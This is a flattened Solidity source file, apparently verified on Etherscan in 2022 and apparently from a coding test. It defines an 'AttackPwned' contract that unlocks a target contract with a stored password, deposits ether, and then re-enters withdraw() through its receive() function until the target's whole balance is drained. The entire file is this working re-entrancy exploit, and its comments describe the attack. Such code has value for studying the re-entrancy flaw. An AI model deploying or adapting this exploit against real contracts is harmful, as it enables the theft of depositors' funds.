/**
 *Submitted for verification at Etherscan.io on 2022-07-28
*/

/** 
 *  SourceUnit: /Users/sg99xxml/projects/ergonia-codetest-send/contracts/AttackPwned.sol
*/
            
////// SPDX-License-Identifier-FLATTEN-SUPPRESS-WARNING: UNLICENSED
pragma solidity ^0.8.0;

interface IPwned {

    function unlock(bytes32 _password) external;

    function lock(bytes32 _password) external;

    function getBalance(address _request) external view returns (uint balance);

    function deposit(address _to) external payable;

    function withdraw(uint _amount) external;
}


/** 
 *  SourceUnit: /Users/sg99xxml/projects/ergonia-codetest-send/contracts/AttackPwned.sol
*/

////import "./interfaces/IPwned.sol";

contract AttackPwned {
    IPwned public pwn;
    uint256 initialDeposit;
    bytes32 private password;

    constructor(address _pwnAddress, bytes32 _password) {
        pwn = IPwned(_pwnAddress);
        password = _password;
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "send some more ether");

        // unlock the contract
        pwn.unlock(password);

        // deposit some funds
        initialDeposit = msg.value;

        pwn.deposit{value: initialDeposit}(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by pwned contract
        callWithdraw();
    }

    function callWithdraw() private {
        // this balance correctly updates after withdraw
        uint256 pwnTotalRemainingBalance = address(pwn).balance;
        // are there more tokens to empty?
        bool keepRecursing = pwnTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
            initialDeposit < pwnTotalRemainingBalance
            ? initialDeposit
            : pwnTotalRemainingBalance;
            pwn.withdraw(toWithdraw);
        }
    }
}